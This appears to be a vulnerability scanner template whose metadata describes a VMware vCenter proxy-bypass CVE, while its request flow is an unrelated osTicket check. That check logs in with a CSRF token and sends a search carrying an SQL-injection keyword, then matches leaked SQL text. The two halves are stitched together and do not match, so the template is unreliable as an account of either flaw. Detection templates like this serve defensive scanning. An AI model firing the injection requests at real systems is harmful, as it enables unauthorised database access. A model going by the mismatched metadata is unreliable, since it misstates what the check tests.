    cwe-id: NVD-CWE-noinfo
    epss-percentile: 0.98895
    epss-score: 0.76281
  description: 'Rhttproxy as used in vCenter Server contains a vulnerability due to
    improper implementation of URI normalization. A malicious actor with network access
    to port 443 on vCenter Server may exploit this issue to bypass proxy leading to
    internal endpoints being accessed.

    '
  impact: 'Attackers can bypass proxy restrictions and access internal endpoints,
    potentially leading to information disclosure or further internal network compromise.

    '
  metadata:
    max-request: 2
    product: vcenter_server
    shodan-query: VMware vCenter Server
    vendor: vmware
    verified: true
  name: vCenter Server - Improper Access Control
  reference:
  - https://github.com/wangsir01/docs/blob/7c20bbf43ae467c1bdc54c65c9a3230ae3e81d63/CVE-2021-22017-22005%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/CVE-2021-22017-22005%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90.md
  - https://www.vmware.com/security/advisories/VMSA-2021-0020.html
  - https://nvd.nist.gov/vuln/detail/CVE-2021-22017
  remediation: 'Apply the latest security patches or updates provided by VMware for
    vCenter Server.

    '
  severity: medium
  tags: cve,cve2021,vmware,vcenter,vkev,kev
variables:
  plugintype: '{{randbase(8)}}'
---
flow: http(1) && http(2)
http:
- extractors:
  - group: 1
    internal: true
    name: csrftoken
    part: body
    regex:
    - __CSRFToken__" value="(.*?)"
    type: regex
  matchers:
  - dsl:
    - contains(tolower(body), "osticket")
    internal: true
    type: dsl
  raw:
  - 'GET /scp/login.php HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - dsl:
    - contains_all(body_2, "FROM (SELECT", "topic_id_val\'\' IN NATURAL", "ORDER BY
      relevance")
    type: dsl
  raw:
  - 'POST /scp/login.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    __CSRFToken__={{csrftoken}}&do=scplogin&userid={{username}}&passwd={{password}}&ajax=1

    '
  - 'GET /tickets.php?a=search&keywords=text''+:1&topic_id=topic_id_val HTTP/1.1

    Host: {{Hostname}}

    '
